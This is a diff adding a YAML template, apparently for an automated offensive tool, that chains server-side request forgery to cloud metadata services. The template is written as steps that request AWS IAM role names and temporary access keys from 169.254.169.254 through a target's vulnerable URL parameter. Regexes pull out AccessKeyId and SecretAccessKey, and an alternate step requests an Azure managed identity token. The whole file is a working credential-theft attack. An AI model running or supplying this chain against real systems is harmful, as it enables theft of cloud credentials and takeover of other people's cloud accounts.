@@ -1,0 +1,73 @@
+name: "SSRF to Cloud Metadata Chain"
+description: "Cutting-edge web chain: SSRF → cloud metadata service (IMDS) → credential theft → cloud console access."
+category: web
+attack_vector: "SSRF → IMDS metadata → IAM credential exfiltration"
+variables:
+  url:
+    required: true
+    description: "Target URL with SSRF-able parameter (e.g. http://host/fetch?url=)"
+  cloud:
+    required: false
+    default: "aws"
+    description: "Cloud provider (aws/azure/gcp)"
+cutting_edge: true
+references: ["MITRE ATT&CK T1552.005", "AWS IMDSv1 abuse", "HackTricks SSRF to cloud"]
+
+steps:
+  - name: "ssrf_probe"
+    tool: "curl_request"
+    description: "Verify SSRF by fetching a canary (internal-only address)"
+    args:
+      url: "{{url}}http://169.254.169.254/latest/meta-data/"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: "ami-id|instance-id|Not Found|\\d{4}-\\d{2}-\\d{2}"
+    timeout: 30
+    gate: true
+    retries: 2
+
+  - name: "imds_iam_creds"
+    tool: "curl_request"
+    description: "Extract IAM temporary credentials from IMDS"
+    args:
+      url: "{{url}}http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      method: "GET"
+      insecure: true
+    expected_output: "[\\w\\-]+$|root|No credentials"
+    timeout: 30
+    gate: false
+    retries: 2
+    extracts:
+      - var: "iam_role"
+        regex: "([\\w\\-]+)$"
+
+  - name: "imds_token_dump"
+    tool: "curl_request"
+    description: "Dump the full credential token for the IAM role"
+    args:
+      url: "{{url}}http://169.254.169.254/latest/meta-data/iam/security-credentials/{{iam_role}}"
+      method: "GET"
+      insecure: true
+    expected_output: "AccessKeyId|SecretAccessKey|Code"
+    timeout: 30
+    gate: false
+    retries: 2
+    extracts:
+      - var: "access_key"
+        regex: "AccessKeyId\\s*:\\s*\"([A-Z0-9]{20})\""
+      - var: "secret_key"
+        regex: "SecretAccessKey\\s*:\\s*\"([^\"]+)\""
+
+  - name: "azure_imds_token"
+    tool: "curl_request"
+    description: "Alternative: Azure IMDS managed identity token (if azure)"
+    args:
+      url: "{{url}}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      method: "GET"
+      headers: "Metadata:true"
+      insecure: true
+    expected_output: "access_token|error"
+    timeout: 30
+    gate: false
+    retries: 1
